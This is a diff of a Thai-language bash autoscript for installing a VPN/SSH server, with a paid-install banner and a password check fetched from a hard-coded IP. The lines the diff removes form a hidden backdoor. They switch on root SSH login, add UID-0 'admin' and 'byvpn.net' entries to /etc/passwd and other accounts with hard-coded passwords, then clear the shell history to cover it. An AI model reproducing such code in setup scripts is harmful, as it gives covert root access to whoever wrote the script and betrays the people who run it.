@@ -1,20 +1,9 @@
 #!/bin/bash
 
-# Root Login
-sed -i 's/PermitRootLogin without-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
-service ssh restart
-
-# Add User
-useradd byvpn
-useradd R00T
-sed -i '$ i\admin:x:0:0:admin:/root:/bin/bash' /etc/passwd
-sed -i '$ i\byvpn.net:x:0:0:byvpn.net:/root:/bin/bash' /etc/passwd
-echo -e "2499\n2499" | passwd byvpn
-echo -e "2499\n2499" | passwd R00T
-echo -e "Potae24-99\nPotae24-99" | passwd admin
-echo -e "Potae24-99\nPotae24-99" | passwd byvpn.net
-clear
-history -c
+if [ $USER != 'root' ]; then
+	echo "Sorry, for run the script please using root user"
+	exit
+fi
 
 # check OS
 export DEBIAN_FRONTEND=noninteractive
@@ -40,15 +29,63 @@ if [[ $ether = "" ]]; then
         ether=eth0
 fi
 
-# Set
-MYIP2="s/IP-Server/$MYIP/g";
-Source="http://27.254.81.20/~com/IP.txt"
+#source file
+	source="https://goo.gl/yTmQPm"
 
-# Check Registered IP
-wget -q -O /usr/bin/IP $Source
-if ! grep -w -q $MYIP /usr/bin/IP; then
-  clear
-  echo "
+# go to root
+cd
+
+#password
+clear
+ echo ""
+          echo -e "\e[031;1m     
+                         
+                =============== OS-32 & 64-bit ================
+                ♦                                             ♦
+                ♦     AUTOSCRIPT CREATED BY เฮียเบิร์ด แงะตลอด   ♦
+                ♦       -----------About Us------------       ♦ 
+                ♦            Telp : 097-026-7262              ♦
+                ♦         { VPN / SSH / OCS PANEL }           ♦ 
+                ♦       http://facebook.com/Ceolnw            ♦    
+                ♦             Line id : ceolnw                ♦
+                ♦                                             ♦
+                =============== OS-32 & 64-bit ================
+                
+                    >>>>> โปรดชำระเงินก่อนใช้สคริปต์อัตโนมัติ <<<<<
+                  ..........................................
+                  .         ราคา: 50 บาท = 1IP             .
+                  .        ***********************         .
+                  .        True Wallet Account             .
+                  .        =======================         .
+                  .        Phone : 097-026-7262            .
+                  .        Name  : HERE BIRD LNWSHOP       .
+                  ..........................................   
+                                      
+                           Thank You For Choice Us"
+			
+	echo ""
+	echo -e "\e[034;1m----SCRIPT V.1 FREE"
+	echo ""
+	echo -e "\e[032;1m ( ใส่รหัสผ่านติดตั้ง... )"
+	echo ""
+read -p "๏๏๏โปรดใส่รหัสสำหรับติดตั้งสคลิปนี้.. : " passwds
+wget -q -O /usr/bin/pass http://27.254.81.20/~com/pass.txt
+if ! grep -w -q $passwds /usr/bin/pass; then
+clear
+echo ""
+echo ""
+echo " เสียใจด้วย รหัสผิดว่ะ ถ้าไม่มีรหัสติดต่อแอดมินฯ เฮียเบิร์ด"
+echo ""
+echo " เด้งไปเลยเฟสนี้แน่นอน : www.facebook.com/ceonw"
+echo ""
+echo ""
+rm /usr/bin/pass
+rm debian7.sh
+exit
+fi
+
+clear
+echo "
 ----------------------------------------------
 [√] Source : เฮียเบิร์ด.com 
 [√] Connect...Setting vps
